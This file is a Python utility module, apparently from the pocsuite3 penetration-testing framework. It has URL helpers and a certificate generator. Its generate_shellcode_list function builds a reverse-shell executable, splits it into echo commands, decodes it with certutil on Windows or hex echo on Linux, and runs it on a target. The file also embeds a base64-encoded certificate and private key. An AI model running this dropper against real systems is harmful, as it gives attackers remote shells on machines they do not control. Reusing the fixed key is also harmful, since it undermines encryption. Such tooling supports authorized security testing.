import re
import ast
import base64
import binascii
import os
import string
import random
from faker import Faker
from socket import gethostbyname
import urllib.parse
from pocsuite3.lib.core.data import logger, paths
from pocsuite3.lib.core.enums import (
    CUSTOM_LOGGING, OS, OS_ARCH, SHELLCODE_CONNECTION
)
# for pocsuite 2.x
from pocsuite3.lib.core.exception import PocsuiteGenericException
from pocsuite3.shellcodes import OSShellcodes


def urlparse(address):
    if not re.search(r'^[A-Za-z0-9+.\-]+://', address):
        address = 'tcp://{0}'.format(address)
    return urllib.parse.urlparse(address)


def url2ip(url, with_port=False):
    """
    works like turning 'http://baidu.com' => '180.149.132.47'
    """

    url_prased = urlparse(url)
    if url_prased.port:
        ret = gethostbyname(url_prased.hostname), url_prased.port
    elif not url_prased.port and url_prased.scheme == 'https':
        ret = gethostbyname(url_prased.hostname), 443
    else:
        ret = gethostbyname(url_prased.hostname), 80

    return ret if with_port else ret[0]


def str_to_dict(value):
    try:
        return ast.literal_eval(value)
    except ValueError as e:
        logger.log(CUSTOM_LOGGING.ERROR, "conv string failed : {}".format(str(e)))


def random_str(length=10, chars=string.ascii_letters + string.digits):
    return ''.join(random.sample(chars, length))


def generate_random_user_agent():
    return Faker().user_agent()


def get_middle_text(text, prefix, suffix, index=0):
    """
    Simple implementation of obtaining intermediate text

    :param text:Full text to get
    :param prefix:To get the first part of the text
    :param suffix: To get the second half of the text
    :param index: Where to get it from
    :return:
    """
    try:
        index_1 = text.index(prefix, index)
        index_2 = text.index(suffix, index_1 + len(prefix))
    except ValueError:
        # logger.log(CUSTOM_LOGGING.ERROR, "text not found pro:{} suffix:{}".format(prefix, suffix))
        return ''
    return text[index_1 + len(prefix):index_2]


def generate_shellcode_list(listener_ip, listener_port, os_target=OS.WINDOWS, os_target_arch=OS_ARCH.X86,
                            chunked_num=50, profix=None, write_path=None):
    """
    Generate executable shellcode for shell rebound under Windows/Linux. When writing a POC with command execution,
    execute the list returned by this command.

    :param listener_ip: Listening IP
    :param listener_port: Listening port
    :param os_target: System type, default is Windows
    :param os_target_arch: System architecture, the default is x86
    :param chunked_num: Specify how much quantity is one piece, the default is 50
    :param profix: Select the prefix of the command execution, the default is None. Automatically select according to
            the operating system
    :param write_path: The written file directory, when the default is None, Windows will write to the %TEMP% directory,
            Linux will write to the /tmp directory, the file name is random
    :return: list of command
    """

    bad_chars = ["\x00", "\x0a", "\x0d", "\x3b"]
    s = OSShellcodes(os_target, os_target_arch, listener_ip, listener_port, bad_chars)
    connection_type = SHELLCODE_CONNECTION.REVERSE
    filename = random_str(5)
    filepath = os.path.join(paths.POCSUITE_TMP_PATH, filename)
    if os_target == OS.WINDOWS:
        filepath = os.path.join(paths.POCSUITE_TMP_PATH, filename) + '.exe'
    shellcode = s.create_shellcode(
        connection_type,
        encode='',
        make_exe=1,
        debug=0,
        # dll_inj_funcs=dll_funcs,
        filename=filename,
        # use_precompiled=False
    )
    if not os.path.exists(filepath):
        raise PocsuiteGenericException("generate file does not exist!")
    with open(filepath, 'rb') as f:
        data = f.read()

    os.unlink(filepath)
    if profix is None:
        if os_target == OS.WINDOWS:
            profix = "cmd.exe /q /c "
        elif os_target == OS.LINUX:
            profix = ""

    index = 0
    cmd = []
    rand_str = random_str(4)
    if os_target == OS.WINDOWS:
        data = base64.b64encode(data).decode()
        length = len(data)

        if write_path is None:
            write_path = "%TEMP%"
        filename = r"{path}\{rand}.bs4".format(path=write_path, rand=rand_str)
        filename_out = r"{path}\{rand}.exe".format(path=write_path, rand=rand_str)
        while 1:
            if index > length:
                break
            _cmd = data[index:index + chunked_num]
            flag = ">>"
            if index == 0:
                flag = ">"
            cmd.append(profix + r"echo {payload} {flag} {filename}".format(payload=_cmd, flag=flag, filename=filename))
            index = index + chunked_num
        cmd.append(profix + "certutil -decode {input} {output}".format(input=filename, output=filename_out))
        cmd.append(profix + filename_out)
    elif os_target == OS.LINUX:
        length = len(data)
        echo_prefix = "\\x"
        if write_path is None:
            write_path = "/tmp"
        filename = r"{path}/{rand}".format(path=write_path, rand=rand_str)
        while 1:
            if index > length:
                break

            block = str(binascii.hexlify(data[index:index + chunked_num]), "utf-8")
            block = echo_prefix + echo_prefix.join(a + b for a, b in zip(block[::2], block[1::2]))
            command = profix + 'echo -ne "{}" >> {}'.format(block, filename)
            cmd.append(command)
            index = index + chunked_num
        cmd.append("chmod u+x " + filename)
        cmd.append(profix + filename)

    return cmd


def gen_cert(countryName='',
             stateOrProvinceName='',
             localityName='',
             organizationName='',
             organizationUnitName='',
             commonName='',
             emailAddress='',
             serialNumber=0,
             validityStartInSeconds=0,
             validityEndInSeconds=0,
             filepath="cacert.pem"):

    # openssl library dependencies is too heavy, so we move it to extras_require
    try:
        from OpenSSL import crypto
        fake = Faker()
        domain_name = fake.domain_name()
        yr = 24 * 3600 * 365
        vf = -1 * random.randint(0, yr * 3) - yr
        vt = vf + random.randint(5, 9) * yr
        # create a key pair
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 2048)
        # create a self-signed cert
        cert = crypto.X509()
        cert.get_subject().C = countryName or 'US'
        cert.get_subject().ST = stateOrProvinceName or fake.state_abbr()
        cert.get_subject().L = localityName or fake.city()
        cert.get_subject().O = organizationName or fake.company()
        cert.get_subject().OU = organizationUnitName or fake.bs().split()[-1]
        cert.get_subject().CN = commonName or domain_name
        cert.get_subject().emailAddress = emailAddress or fake.email().split('@')[0] + '@' + domain_name
        serialNumber = serialNumber or (random.randint(0, 0xffffffff - 1) << 32) + random.randint(0, 0xffffffff - 1)
        cert.set_serial_number(serialNumber)
        cert.gmtime_adj_notBefore(validityStartInSeconds or vf)
        cert.gmtime_adj_notAfter(validityEndInSeconds or vt)
        cert.set_issuer(cert.get_subject())
        cert.set_version(2)
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')
        logger.info("Successfully generated a self-signed certificate")
        with open(filepath, "wb+") as fw:
            fw.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
            fw.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
    except ImportError:
        logger.warning('pyOpenSSL not installed, use hard-code certificate instead')
        # base64 encoding to avoid cert leak warning
        hard_coded_cert_base64 = (
            b'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR2akNDQXFhZ0F3SUJBZ0lJWVNpZnhqek80'
            b'elF3RFFZSktvWklodmNOQVFFTEJRQXdnWjR4Q3pBSkJnTlYKQkFZVEFsVlRNUXN3Q1FZRFZRUUlE'
            b'QUpPU2pFWk1CY0dBMVVFQnd3UVYyVnpkQ0JCYm5Sb2IyNTViR0Z1WkRFVwpNQlFHQTFVRUNnd05V'
            b'Mk5vYm1WcFpHVnlJRXhNUXpFVk1CTUdBMVVFQ3d3TVlXTjBhVzl1TFdsMFpXMXpNUkV3CkR3WURW'
            b'UVFEREFoamFHVnVMbUpwZWpFbE1DTUdDU3FHU0liM0RRRUpBUllXWVd4c2FYTnZibTFwYkd4bGNr'
            b'QmoKYUdWdUxtSnBlakFlRncweU1EQXhNREV4TkRBeE1UVmFGdzB5T0RFeU1qa3hOREF4TVRWYU1J'
            b'R2VNUXN3Q1FZRApWUVFHRXdKVlV6RUxNQWtHQTFVRUNBd0NUa294R1RBWEJnTlZCQWNNRUZkbGMz'
            b'UWdRVzUwYUc5dWVXeGhibVF4CkZqQVVCZ05WQkFvTURWTmphRzVsYVdSbGNpQk1URU14RlRBVEJn'
            b'TlZCQXNNREdGamRHbHZiaTFwZEdWdGN6RVIKTUE4R0ExVUVBd3dJWTJobGJpNWlhWG94SlRBakJn'
            b'a3Foa2lHOXcwQkNRRVdGbUZzYkdsemIyNXRhV3hzWlhKQQpZMmhsYmk1aWFYb3dnZ0VpTUEwR0NT'
            b'cUdTSWIzRFFFQkFRVUFBNElCRHdBd2dnRUtBb0lCQVFDeXFHdFJBUGNHCkF4SGZsTm1oV3BBKzJK'
            b'ZVArZVg1ejN4OXJaWkVsWVJhTm04bWhNd25PbW83Z3ppOENEM0k0SXIvc3ArZG1uejQKUUpENTZi'
            b'NUh5bzVNbHB4Y0dtcmxTYkRzWmlrRTBHWmZBcG9oVjVFMy9XUFBDaHFJSGxpWlBUZGEwaG1sZ1ha'
            b'NwpzRmpMcmZtcEFQcmt2OGdmV0ZjNlZsaCtsbFFpMnRNMm9MYTdMaVBTeVdycXc5NjVXZG9rTzRJ'
            b'b29HQ25XUUI4CkpiVmlYZEpFNEduZVF0cDBiQXplbzFsdHNadXNGOCtDdmQ2dGxSV0ZWZmUrd3Yv'
            b'TU00UnpYYUFwTGpXSU5Ta2IKMmlWbWI5QmtpZ09VRHF6WUhlRzNWUGZKKzE2cjRicGZxZXljR3hu'
            b'clkyL2Zpa0diRDRHVHRuZ1RITkovcWx5Ugp1Sjd0UkFzMTNUVHpBZ01CQUFFd0RRWUpLb1pJaHZj'
            b'TkFRRUxCUUFEZ2dFQkFES0txR1dyS1ZWcEd1YmVubk5mCnp1Y1BvQk5jb0w2a2kzMVE1SmxKM09Q'
            b'SVJtV3E4aGsycGlyeUxENkNCRER5VnUwd2Jtcnc2bHNrRWZRZE9qVW0KK1cxVElVQzJJeXJUT0w3'
            b'RUY2YTdtT294VnZOSERnQ1JMaHZxakZtN2FlRE1ZMGpueGNycFJjUC9hRVJxSmRHWQovYWlSRDV5'
            b'T0w3U2djVVd4ZEt6TmZiRzViOFcyVUNvTXdOS1NYcTJVRUR6d1U1RUZseTZsSFA3dTN0SE5QOGV6'
            b'Ck9sU0VaUDdxTCswc0l4SitYeEk2ZGNPQzRVTXNSTGFLYjFHNXFoemFhRTFZU3FWWC9LcVBITUgz'
            b'QzhXUXZJdUIKeE8vR2p6cHhBSmRXZzhJYU1qdWZPWExUMW15ZXJnZDU3b29SUVh1OVRJQzdjZG84'
            b'N3Rjei9IMnk1aE83Vkkxbwo2SVU9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0KLS0tLS1CRUdJ'
            b'TiBQUklWQVRFIEtFWS0tLS0tCk1JSUV2Z0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktnd2dn'
            b'U2tBZ0VBQW9JQkFRQ3lxR3RSQVBjR0F4SGYKbE5taFdwQSsySmVQK2VYNXozeDlyWlpFbFlSYU5t'
            b'OG1oTXduT21vN2d6aThDRDNJNElyL3NwK2Rtbno0UUpENQo2YjVIeW81TWxweGNHbXJsU2JEc1pp'
            b'a0UwR1pmQXBvaFY1RTMvV1BQQ2hxSUhsaVpQVGRhMGhtbGdYWjdzRmpMCnJmbXBBUHJrdjhnZldG'
            b'YzZWbGgrbGxRaTJ0TTJvTGE3TGlQU3lXcnF3OTY1V2Rva080SW9vR0NuV1FCOEpiVmkKWGRKRTRH'
            b'bmVRdHAwYkF6ZW8xbHRzWnVzRjgrQ3ZkNnRsUldGVmZlK3d2L01NNFJ6WGFBcExqV0lOU2tiMmlW'
            b'bQpiOUJraWdPVURxellIZUczVlBmSisxNnI0YnBmcWV5Y0d4bnJZMi9maWtHYkQ0R1R0bmdUSE5K'
            b'L3FseVJ1Sjd0ClJBczEzVFR6QWdNQkFBRUNnZ0VBTTd6b1R5NExXM2RhSHJoNWlldXpLREFMUEV1'
            b'dldQZklZcEQ1bW1UK1RpM0QKWkpGQ21mMmx0QlJkUXI3VVBhOGhNY2xseGZ0dVEycFhVYmhxUFZv'
            b'Z2VYZUlVbmZvQ3Z5Yk91cWU2R0Q5dEhnSgpjS3h1UnB1ZjR0NVhMcUl6SURXRktVejgxbHcybHIx'
            b'TUNiZ1pPK01ueFVUd3pIc0Z6OFFmbnBFa1RtKzJpUFBuCml5WUc5YVBqSU90cWNFandxaEJhWWFt'
            b'NVpwM0VOaEJpbkxjemhMb2srVlFnbkxwYlZXU29HbjZTZE5XcWRsbUQKdWxaYVZub1NSWkEwVzgy'
            b'UjhLR01naVUyWUFHamphdmdBeGlBQXNoL1VwSE9nOVBFZHpNMEM5TGZWM2VEY3dQTAp3RXJicldE'
            b'V1B2RXNidy9menkvRXJodEFDbVRFeExoazV2NGVqSnMzcVFLQmdRRG9jam9GTS9OcUpoWGVVRnQ3'
            b'CnV3UCt5TWF6cnVUYnpBV0xKcGptSnlMTEVqNWZqWjhQVi9HUFkxTVAwYjY5TVJzbS9tZ3MyZGIz'
            b'Q2JYS1pTRzcKZTZDRWlVMGdRODFPSVBUWitDUGx1Y1JaVVR2N3hHZU5SOEVUUjMzS1M5MmhZWEpJ'
            b'cFZCNm1kWUlXNFpvSXhuTwpaa09NTFM4SU40WWlrNnJsam04NTZyUEd0UUtCZ1FERXd1VnhTK2ov'
            b'Z01IZGowVG12WHJYbkVjYmxmd1ZhOU1wCnVEUTZIeVhubHFlL0xzb3ZFcmcrV2NFS2FURERmY2k2'
            b'TWZXdzRpVjRDRUdjNHhJeGNwbUY2elFMWFJieGVZK3YKMDZ0KzBtdjI2bkdxeUdOYmlBS1FMYjRw'
            b'SmxCU290c1Z2VGJHTjJzRGRkVTIzN2t0cHpQZ3FmSXZlbUFuZDBseApkU0N1L3UxdUJ3S0JnUURP'
            b'WVh6NldhSHB3Vjd4UUUrNWo5YUFSU3VISmVXMDhYU0trLzUxZXBIOTAzamx4Z3hQCnh6bUdvaDJC'
            b'a2l6VU5lRnh3YmdrK2xWT2lhU0t5emdrQ2lQL0NSa2RhSlhFcEtaQlVYd3QzNzVodnlxTzQxYzkK'
            b'clZQVUZrbXRiNmFjUHJVRm95SE5lUUQ3OHFkbmxxSzNDejAySEhnQng2cWswSStQdWVNdmZSK1pj'
            b'UUtCZ0M3SQpJQUZtQ1FubXRURldoUTFQYzh1YnpwUlNmdE1oQmQzZmZCdHRtSGVOckdpYVdWd0Qy'
            b'V2FKdElvakpJTDJmeWsyCkE3S0FzbVB0b3B3SXFTUzBtS2ZzbWoweGJ1a08vQWpVRE94a1gyTWZy'
            b'dExxUGlWZkd5em9rMVA1VmhPdndPTlUKVDVlbFNYNVRIOVNpTU1jWUFBK2ttSDZOWEJ0R0UySTBk'
            b'UWJtZWRFMUFvR0JBS2xkMnlHTll2eDZMc1F1czlOWgpjVlZNWHFLbFVKY1pSTVY5aGdTdTQ3alZI'
            b'ZnlMMVFRcTFnaG1rU0NpeGVZWXJLSW4xU09ubERsK2VwYTQ3SmxqClhhd3ZNRFREWmxRRGxwS05v'
            b'dEgzbThLQUZ0VUVvQ2dzTm5zM3ZoOERDSXFJUEJEMDRndkV3R3pLYnNhQUM1WGIKUFprd1o0TlFK'
            b'RWlDTnRyMUR6Qmg0ZktuCi0tLS0tRU5EIFBSSVZBVEUgS0VZLS0tLS0K'
        )
        hard_coded_cert = base64.b64decode(hard_coded_cert_base64)
        with open(filepath, "wb+") as fw:
            fw.write(hard_coded_cert)
